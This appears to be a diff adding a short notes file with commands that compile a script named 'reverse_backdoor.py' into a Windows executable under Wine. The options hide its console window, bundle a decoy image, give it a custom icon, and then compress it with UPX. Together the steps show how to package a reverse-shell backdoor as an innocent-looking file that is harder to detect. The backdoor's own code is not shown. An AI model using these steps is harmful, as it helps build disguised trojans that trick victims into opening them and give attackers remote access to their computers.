@@ -1,0 +1,13 @@
+Note: Run all the following commands on the linux terminal
+Windows (.py -> .exe)
+    No embedded file
+        wine /root/.wine/drive_c/Python27/Scripts/pyinstaller.exe --onefile --noconsole reverse_backdoor.py
+    With embedded file
+        wine /root/.wine/drive_c/Python27/Scripts/pyinstaller.exe --add-data "/root/Downloads/cartest.jpeg;." --onefile --noconsole reverse_backdoor.py
+    With icon no embedded file
+        wine /root/.wine/drive_c/Python27/Scripts/pyinstaller.exe --onefile --noconsole --icon "/root/Downloads/iconName.ico" reverse_backdoor.py
+    With icon and embedded file
+        wine /root/.wine/drive_c/Python27/Scripts/pyinstaller.exe --add-data "/root/Downloads/cartest.jpeg;." --onefile --noconsole --icon "/root/Downloads/iconName.ico" reverse_backdoor.py
+Compressing exe
+    /opt/upx/upx exe_location -o new_name.exe
+
